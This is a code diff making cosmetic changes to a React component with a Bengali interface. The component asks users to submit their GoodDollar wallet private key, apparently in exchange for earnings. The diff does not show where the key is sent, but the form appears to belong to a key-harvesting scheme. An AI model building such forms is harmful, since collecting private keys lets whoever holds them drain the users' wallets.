@@ -1,3 +1,4 @@
+
 import { useState } from "react";
 import { useSubmitKey } from "@/hooks/use-earn";
 import { Key, Loader2, ArrowRight } from "lucide-react";
@@ -26,7 +27,7 @@ export function KeySubmitter() {
         <div className="p-2 bg-primary/20 rounded-lg">
           <Key className="w-6 h-6 text-primary" />
         </div>
-        <h2 className="text-xl font-bold">GoodDollar প্রাইভেট কি জমা দিন</h2>
+        <h2 className="text-xl font-bold text-white">GoodDollar প্রাইভেট কি জমা দিন</h2>
       </div>
 
       <div className="bg-destructive/10 border border-destructive/20 rounded-xl p-4 mb-6">
@@ -45,7 +46,7 @@ export function KeySubmitter() {
             type="text"
             value={key}
             onChange={(e) => setKey(e.target.value)}
-            placeholder="e.g. 8266590938..."
+            placeholder="এখানে কি লিখুন..."
             className="input-field font-mono text-lg tracking-wider"
             disabled={isPending}
           />
@@ -59,12 +60,13 @@ export function KeySubmitter() {
           {isPending ? (
             <Loader2 className="w-5 h-5 animate-spin" />
           ) : (
-            <>
-              সাবমিট করুন <ArrowRight className="w-5 h-5" />
-            </>
+            <div className="flex items-center justify-center gap-2">
+              <span>সাবমিট করুন</span>
+              <ArrowRight className="w-5 h-5" />
+            </div>
           )}
         </button>
-        <p className="text-xs text-center text-muted-foreground">
+        <p className="text-xs text-center text-muted-foreground mt-2">
           অপেক্ষা করুন: যাচাই করতে ২-৫ মিনিট সময় লাগতে পারে
         </p>
       </form>
